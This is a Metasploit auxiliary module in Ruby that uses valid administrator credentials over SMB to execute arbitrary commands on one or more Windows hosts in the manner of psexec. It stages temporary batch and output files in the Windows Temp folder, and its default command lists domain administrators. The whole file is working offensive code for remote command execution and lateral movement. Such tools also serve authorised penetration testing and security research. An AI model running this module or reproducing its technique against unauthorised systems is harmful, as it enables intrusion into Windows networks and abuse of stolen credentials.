##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Authenticated Administration Utility',
      'Description'    => %q{
          This module uses a valid administrator username and password to execute an
        arbitrary command on one or more hosts, using a similar technique than the "psexec"
        utility provided by SysInternals. Daisy chaining commands with '&' does not work
        and users shouldn't try it. This module is useful because it doesn't need to upload
        any binaries to the target machine.
      },

      'Author'         => [
        'Royce Davis @R3dy__ <rdavis[at]accuvant.com>',
      ],

      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
        [ 'OSVDB', '3106'],
        [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ],
        [ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
      ]
    ))

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
      OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
      OptString.new('RPORT', [true, 'The Target port', 445]),
      OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
    ])

    register_advanced_options([
      OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files','']),
      OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
      OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
    ])
  end

  # This is the main controle method
  def run_host(ip)
    text = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.txt"
    bat  = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.bat"
    @smbshare = datastore['SMBSHARE']
    @ip = ip

    # Try and authenticate with given credentials
    if connect
      begin
        smb_login
      rescue Rex::Proto::SMB::Exceptions::Error => autherror
        print_error("Unable to authenticate with given credentials: #{autherror}")
        return
      end
      output = execute_command_with_output(text, bat, datastore['COMMAND'], @smbshare, @ip, datastore['RETRY'], datastore['DELAY'])

      unless output.nil?
        print_good("Command completed successfully!")
        print_status("Output for \"#{datastore['COMMAND']}\":\n")
        print_line("#{output}\n")
        report_note(
          :rhost => datastore['RHOSTS'],
          :rport => datastore['RPORT'],
          :type  => "psexec_command",
          :name => datastore['COMMAND'],
          :data => output
        )
      end
      disconnect
    end
  end

end
